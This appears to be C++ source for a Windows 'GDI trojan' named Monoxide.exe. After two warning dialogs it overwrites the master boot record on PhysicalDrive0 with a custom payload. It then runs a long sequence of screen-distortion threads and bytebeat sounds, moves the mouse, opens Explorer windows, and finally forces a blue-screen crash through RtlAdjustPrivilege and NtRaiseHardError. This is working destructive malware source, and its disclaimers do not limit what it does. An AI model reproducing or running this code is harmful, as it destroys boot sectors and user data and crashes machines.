VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24500, 24500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[24500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 6 ^ t & t >> 9 ^ t >> 12 | (t << (t >> 6) % 4 ^ -t & -t >> 13) % 128 ^ -t >> 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 15] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * rand());

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24500, 24500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[24500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 6 + t & t >> 9 ^ t >> 12 | (t << (t >> 6) % 4 ^ -t & -t >> 13) % 128 + -t >> 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
int main() {
	if (MessageBoxW(NULL, L"WARNING!\n\nYou have ran a Trojan known as Monoxide.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", L"Malware alert - Monoxide.exe", MB_ICONWARNING | MB_YESNO) != IDYES)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", L"Malware alert - Monoxide.exe", MB_ICONWARNING | MB_YESNO) != IDYES)
		{
			ExitProcess(0);
		}
		else
		{
			unsigned char MBR[] = {
0x31, 0x00, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E,
0xD0, 0xBC, 0x00, 0x7C, 0xFB, 0xB0, 0x13, 0xCD,
0x10, 0xB8, 0x01, 0x00, 0xBB, 0x00, 0x0E, 0xB0,
0x07, 0x8E, 0x0E, 0x31, 0xF7, 0x0F, 0x01, 0xA0,
0x81, 0xFF, 0x00, 0x02, 0x74, 0x0A, 0xFA, 0x75,
0xF7, 0xEB, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x55, 0xAA
			};
			HANDLE ar = CreateFileW(
				L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING,0, 0);

			DWORD wb;WriteFile(ar, (LPVOID)MBR, 512, &wb, NULL );
			Sleep(6000);
			std::ofstream outfile("æ¯”è¾ƒè¾“å…¥çš„éªŒè¯ç å’Œå®žé™…ç”Ÿæˆçš„éªŒè¯ç æ˜¯å¦ç›¸å.txt"); // 创建一个输出流对象并打开文件
			if (outfile.is_open()) {
				outfile << "æ¯”è¾ƒè¾“å…¥çš„éªŒè¯ç å’Œå®žé™…ç”Ÿæˆçš„éªŒè¯ç æ˜¯å¦ç›¸å" << std::endl; // 写入数据并换行
				outfile << "±×÷√∑∏∫∞≈≠≤≥." << std::endl;
			}
			HANDLE thread1 = CreateThread(0, 0, p34, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, balls, 0, 0, 0);
			HANDLE thread1dot2 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread1dot3 = CreateThread(0, 0, d, 0, 0, 0);
			HANDLE thread1dot4 = CreateThread(0, 0, qr, 0, 0, 0);
			HANDLE thread1dot5 = CreateThread(0, 0, i07, 0, 0, 0);
			HANDLE thread1dot6 = CreateThread(0, 0, icons, 0, 0, 0);
			HANDLE hThread3 = CreateThread(NULL, 0, MouseMoveThread, NULL, 0, NULL);//鼠标瞬移
			HANDLE hThread2 = CreateThread(NULL, 0, system32, NULL, 0, NULL);//打开此电脑，文件等...
			HANDLE hThread1 = CreateThread(NULL, 0, rd200, NULL, 0, NULL);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			TerminateThread(thread1dot1, 0);
			CloseHandle(thread1dot1);
			TerminateThread(thread1dot2, 0);
			CloseHandle(thread1dot2);
			TerminateThread(thread1dot3, 0);
			CloseHandle(thread1dot3);
			TerminateThread(thread1dot4, 0);
			CloseHandle(thread1dot4);
			TerminateThread(thread1dot5, 0);
			CloseHandle(thread1dot5);
			TerminateThread(thread1dot6, 0);
			CloseHandle(thread1dot6);
			InvalidateRect(0, 0, 0);
			Sleep(300);
			HANDLE thread2 = CreateThread(0, 0, sr100, 0, 0, 0);
			HANDLE thread2dot1 = CreateThread(0, 0, balls, 0, 0, 0);
			HANDLE thread2dot2 = CreateThread(0, 0, sh, 0, 0, 0);
			HANDLE thread2dot3 = CreateThread(0, 0, d03, 0, 0, 0);
			sound2();
			Sleep(15000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			TerminateThread(thread2dot2, 0);
			CloseHandle(thread2dot2);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, p34, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, sr200, 0, 0, 0);
			HANDLE thread3dot2 = CreateThread(0, 0, sr400, 0, 0, 0);
			HANDLE thread3dot3 = CreateThread(0, 0, d, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			TerminateThread(thread2dot1, 0);
			CloseHandle(thread2dot1);
			TerminateThread(thread2dot3, 0);
			CloseHandle(thread2dot3);
			TerminateThread(thread3dot1, 0);
			CloseHandle(thread3dot1);
			TerminateThread(thread3dot2, 0);
			CloseHandle(thread3dot2);
			TerminateThread(thread3dot3, 0);
			CloseHandle(thread3dot3);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, draw, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, sr100, 0, 0, 0);
			HANDLE thread4dot2 = CreateThread(0, 0, dra, 0, 0, 0);
			HANDLE thread4dot3 = CreateThread(0, 0, swirl, 0, 0, 0);
			HANDLE thread4dot4 = CreateThread(0, 0, p34, 0, 0, 0);
			HANDLE thread4dot5 = CreateThread(0, 0, icons, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			TerminateThread(thread4dot1, 0);
			CloseHandle(thread4dot1);
			TerminateThread(thread4dot2, 0);
			CloseHandle(thread4dot2);
			TerminateThread(thread4dot3, 0);
			CloseHandle(thread4dot3);
			TerminateThread(thread4dot4, 0);
			CloseHandle(thread4dot4);
			TerminateThread(thread4dot5, 0);
			CloseHandle(thread4dot5);
			InvalidateRect(0, 0, 0);
			Sleep(10);
			HANDLE thread5 = CreateThread(0, 0, swirl, 0, 0, 0);
			HANDLE thread5dot1 = CreateThread(0, 0, sr100, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			TerminateThread(thread5dot1, 0);
			CloseHandle(thread5dot1);
			InvalidateRect(0, 0, 0);
			Sleep(10);
			HANDLE thread6 = CreateThread(0, 0, swirl, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, sr100, 0, 0, 0);
			HANDLE thread6dot2 = CreateThread(0, 0, p34, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			TerminateThread(thread6dot1, 0);
			CloseHandle(thread6dot1);
			TerminateThread(thread6dot2, 0);
			CloseHandle(thread6dot2);
			InvalidateRect(0, 0, 0);
			Sleep(50); HANDLE thread7 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread7dot1 = CreateThread(0, 0, sr300, 0, 0, 0);
			HANDLE thread7dot2 = CreateThread(0, 0, sr400, 0, 0, 0);
			sound5();
			Sleep(15000);
			TerminateThread(thread7, 0);
		    CloseHandle(thread7);
			TerminateThread(thread7dot1, 0);
			CloseHandle(thread7dot1);
			TerminateThread(thread7dot2, 0);
			CloseHandle(thread7dot2);
			InvalidateRect(0, 0, 0);
			HANDLE thread8 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread8dot1 = CreateThread(0, 0, rd600, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			TerminateThread(thread8dot1, 0);
			CloseHandle(thread8dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread9 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread9dot1 = CreateThread(0, 0, sr300, 0, 0, 0);
			HANDLE thread9dot2 = CreateThread(0, 0, sr400, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			TerminateThread(thread9dot1, 0);
			CloseHandle(thread9dot1);
			TerminateThread(thread9dot2, 0);
			CloseHandle(thread9dot2);
			InvalidateRect(0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, drawEllipse, 0, 0, 0);
			HANDLE thread10dot1 = CreateThread(0, 0, draw, 0, 0, 0);
			HANDLE thread10dot2 = CreateThread(0, 0, sr200, 0, 0, 0);
			HANDLE thread10dot3 = CreateThread(0, 0, shader15, 0, 0, 0);
			sound9();
			Sleep(8000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			TerminateThread(thread10dot1, 0);
			CloseHandle(thread10dot1);
			TerminateThread(thread10dot2, 0);
			CloseHandle(thread10dot2);
			TerminateThread(thread10dot3, 0);
			CloseHandle(thread10dot3);
			InvalidateRect(0, 0, 0);
			HANDLE thread11 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread11dot1 = CreateThread(0, 0, sr300, 0, 0, 0);
			HANDLE thread11dot2 = CreateThread(0, 0, sr400, 0, 0, 0);
			HANDLE thread11dot3 = CreateThread(0, 0, rd600, 0, 0, 0);
			Sleep(10000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			TerminateThread(thread11dot1, 0);
			CloseHandle(thread11dot1);
			TerminateThread(thread11dot2, 0);
			CloseHandle(thread11dot2);
			TerminateThread(thread11dot3, 0);
			CloseHandle(thread11dot3);
			InvalidateRect(0, 0, 0);
			HANDLE thread12 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread12dot1 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread12dot2 = CreateThread(0, 0, swirl, 0, 0, 0);
			Sleep(12000);
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			TerminateThread(thread12dot1, 0);
			CloseHandle(thread12dot1);
			TerminateThread(thread12dot2, 0);
			CloseHandle(thread12dot2);
			InvalidateRect(0, 0, 0);
			HANDLE thread13 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread13dot1 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread13dot2 = CreateThread(0, 0, swirl, 0, 0, 0);
			sound10();
			Sleep(11000);
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			TerminateThread(thread13dot1, 0);
			CloseHandle(thread13dot1);
			TerminateThread(thread13dot2, 0);
			CloseHandle(thread13dot2);
			InvalidateRect(0, 0, 0);
			HANDLE thread14 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread14dot1 = CreateThread(0, 0, sr300, 0, 0, 0);
			HANDLE thread14dot2 = CreateThread(0, 0, sr400, 0, 0, 0);
			HANDLE thread14dot3 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread14dot4 = CreateThread(0, 0, d03, 0, 0, 0);
			HANDLE thread14dot5 = CreateThread(0, 0, p34, 0, 0, 0);
			Sleep(19000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			TerminateThread(thread14dot1, 0);
			CloseHandle(thread14dot1);
			TerminateThread(thread14dot2, 0);
			CloseHandle(thread14dot2);
			TerminateThread(thread14dot3, 0);
			CloseHandle(thread14dot3);
			TerminateThread(thread14dot4, 0);
			CloseHandle(thread14dot4);
			TerminateThread(thread14dot5, 0);
			CloseHandle(thread14dot5);
			InvalidateRect(0, 0, 0);
			HANDLE thread15 = CreateThread(0, 0, d03, 0, 0, 0);
			HANDLE thread15dot1 = CreateThread(0, 0, p34, 0, 0, 0);
			sound11();
			Sleep(15000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &response);
			Sleep(282000);
		}
	}
}